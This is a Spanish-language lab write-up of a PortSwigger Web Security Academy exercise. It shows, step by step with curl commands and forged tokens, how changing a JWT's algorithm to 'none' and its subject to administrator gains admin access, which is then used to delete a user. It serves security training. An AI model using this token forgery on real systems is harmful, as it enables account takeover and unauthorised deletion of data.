##write up##

#1.analisis basico
nos logueamos primero con nuestras credenciales para revisar
como funciona el login y aparte revisar nuestro token jwt
```bash
curl -X POST -d "username=wiener" -d "password=peter" -d "csrf=q8saT22ZQm4B8kDGdfhgHgvY0hdDY9k8" -c cookies.txt https://0a84009103da55db8438fa7000320015.web-security-academy.net/login -L -i
```
este comsndo automaticamente nos redirige a nuestro login page
y vemos nuestro token jwt

```bash
eyJraWQiOiJkMTY4ODdlYS05MjU1LTQwYzgtODFhYy0zNDI5MTI5OWY4ODciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2ODE1MzIzNCwic3ViIjoid2llbmVyIn0.bbpENS-W1K0o7txWTRRMdt7i2PFkQESDoO3ZZFfI2AtwiYB5I2ww4JvFa8vkHUExNd67-YxiuwHQd2obv1IQRwBDySgfqIGIgnTo72lDS-3G5GkuqmYfN1_iLeW0IVmTPIrRqlz5cHFWqDM-FP380VkhNZWQv56qQmlIAJbomb-H01zFHUDEX-35EQqoPUAkoZHE_qCZLHfGqyAl3Do5gwVhbQQ3wKkJnyfNy8Iq9TNS_hveBMDV8jayBFBwuuMc_uHJ-JNESVm0INr33OsbTCJ_PvRGG81_jZDrIdQSqDJAeDdxVClmJ6PhP5lgwC1c2Ao1msDoZduYve1WO040jA

```

lo podemos decoficiar usando la pagina de jwt.io,al hacerlo podemos
codificar otro token jwt con la clave en none,y el sub en administrator

```bash
eyJraWQiOiJkMTY4ODdlYS05MjU1LTQwYzgtODFhYy0zNDI5MTI5OWY4ODciLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2ODE1MzIzNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

con esto nos podemos loguear como admin modificando el token
```bash
curl -H "cookie: session=eyJraWQiOiJkMTY4ODdlYS05MjU1LTQwYzgtODFhYy0zNDI5MTI5OWY4ODciLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2ODE1MzIzNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9." "https://0a84009103da55db8438fa7000320015.web-security-academy.net/admin" -v
```
ese comando entre otras cosas nos da la siguiente salida

```html

                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>

```
el resto del reto seria solo ir al link del href que nos dan
para borrar al usuario carlos


```bash
curl -H "cookie: session=eyJraWQiOiJkMTY4ODdlYS05MjU1LTQwYzgtODFhYy0zNDI5MTI5OWY4ODciLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2ODE1MzIzNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9." "https://0a84009103da55db8438fa7000320015.web-security-academy.net/admin/delete?username=carlos" -v
```
